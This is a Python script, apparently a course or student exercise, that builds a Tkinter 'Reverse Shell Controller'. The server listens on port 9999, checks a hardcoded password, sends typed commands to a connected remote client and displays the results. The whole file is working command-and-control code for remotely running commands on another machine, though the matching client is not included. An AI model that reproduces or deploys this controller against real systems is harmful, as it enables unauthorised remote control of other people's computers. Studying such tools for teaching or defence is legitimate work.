#!/usr/bin/env python3

# What is this commantd? And why some phytons scripst start with it.

# Step 1: Creating a socket
# Step 2: Binding the socket and listening
# Step 3: Accepting connection
# Step 4: Sending command to the client
# Step 5: Client to server connection
# Step 6: Completing the client file

"""
Reverse Shell Server with a GUI Interface
-------------------------------------------
This server listens for an incoming reverse connection and provides a simple
GUI (using Tkinter) to send commands and display output.
Includes password-based authentication.
"""

import socket
import threading
import tkinter as tk
from tkinter import scrolledtext
import sys

# Configuration
HOST = ''    # Listen on all available interfaces
PORT = 9999  # Port for incoming connections

# Authentication configuration
# In a production environment, this should be securely stored (not hardcoded)
PASSWORD = "2025@UPC"  # We can change this password for a stronger one

class ReverseShellGUI:
    def __init__(self, master):
        self.master = master
        master.title("Reverse Shell Controller")

        # A scrollable text area to display output from the client
        self.output_area = scrolledtext.ScrolledText(master, wrap=tk.WORD, width=80, height=20)
        self.output_area.pack(padx=10, pady=10)

        # An entry widget to type commands
        self.entry = tk.Entry(master, width=80)
        self.entry.pack(padx=10, pady=(0,10))
        # Bind the "Enter" key to send commands
        self.entry.bind("<Return>", self.send_command)

        # A button to send commands
        self.send_button = tk.Button(master, text="Send", command=self.send_command)
        self.send_button.pack(pady=(0,10))

        # Create a socket for the server
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            # Bind the socket to a host/port and start listening for connections
            self.server_socket.bind((HOST, PORT))
            self.server_socket.listen(1)
            self.write_output(f"[*] Listening on port {PORT}...\n")
        except socket.error as e:
            self.write_output(f"[!] Socket error: {e}\n")
            sys.exit(1)

        self.conn = None
        self.addr = None

        # Start a background thread that will accept a connection
        threading.Thread(target=self.accept_connection, daemon=True).start()

    def write_output(self, message):
        """
        Insert a message into the output area and auto-scroll to the end.
        """
        self.output_area.insert(tk.END, message)
        self.output_area.see(tk.END)

    def authenticate_client(self):
        """
        Authenticate the client using a password
        """
        try:
            # Wait to receive the password from client
            client_password = self.conn.recv(1024).decode('utf-8')
            
            # Compare with the stored password
            if client_password == PASSWORD:
                self.conn.send("AUTH_SUCCESS".encode('utf-8'))
                self.write_output("[*] Client authenticated successfully\n")
                return True
            else:
                self.conn.send("AUTH_FAILED".encode('utf-8'))
                self.write_output("[!] Client authentication failed\n")
                return False
        except Exception as e:
            self.write_output(f"[!] Authentication error: {e}\n")
            return False

    def accept_connection(self):
        """
        Wait and accept an incoming connection from client
        """
        try:
            self.conn, self.addr = self.server_socket.accept()
            self.write_output(f"[*] Connection established from {self.addr[0]}:{self.addr[1]}\n")
            
            # Authenticate the client
            if not self.authenticate_client():
                self.write_output(f"[!] Closing unauthenticated connection from {self.addr[0]}:{self.addr[1]}\n")
                self.conn.close()
                # Try accepting a new connection after failed authentication
                threading.Thread(target=self.accept_connection, daemon=True).start()
                return
                
            # Start receiving data in the background
            threading.Thread(target=self.receive_data, daemon=True).start()
        except Exception as e:
            self.write_output(f"[!] Error accepting connection: {e}\n")

    def receive_data(self):
        """
        Continuously receive data from the client and display it in the GUI.
        """
        while True:
            try:
                data = self.conn.recv(4096)
                if not data:
                    self.write_output("[*] Connection closed by the remote host.\n")
                    # Try accepting new connections after this one closes
                    threading.Thread(target=self.accept_connection, daemon=True).start()
                    break
                decoded = data.decode('utf-8', errors='ignore')
                self.write_output(decoded)
            except Exception as e:
                self.write_output(f"[!] Error receiving data: {e}\n")
                # Try accepting new connections after an error
                threading.Thread(target=self.accept_connection, daemon=True).start()
                break

    def send_command(self, event=None):
        """
        Send a command to the connected client.
        """
        if self.conn:
            cmd = self.entry.get().strip()
            if cmd:
                try:
                    self.conn.send(cmd.encode('utf-8'))
                    self.write_output(f"\n[>] {cmd}\n")
                except Exception as e:
                    self.write_output(f"[!] Failed to send command: {e}\n")
                self.entry.delete(0, tk.END)

                if cmd.lower() == "quit":
                    self.conn.close()
                    self.server_socket.close()
                    self.master.quit()
        else:
            self.write_output("[!] No client connected yet.\n")

if __name__ == '__main__':
    root = tk.Tk()
    gui = ReverseShellGUI(root)
    root.mainloop()
    
